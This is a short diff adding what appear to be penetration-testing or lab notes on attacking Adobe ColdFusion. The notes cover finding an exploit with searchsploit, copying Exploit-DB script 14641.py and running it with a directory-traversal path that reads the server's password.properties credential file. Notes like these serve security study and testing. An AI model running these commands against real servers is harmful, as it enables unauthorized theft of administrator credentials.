@@ -1,0 +1,10 @@
+searchsploit vulnerable versions
+- searchsploit adobe coldfusion
+
+copy the exploitation to a file
+- cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
+
+see the requirements of the exploitation
+- python2 14641.py
+usage: 14641.py <host> <port> <file_path>
+- 14641.py localhost 80 ../../../../../../../lib/password.properties
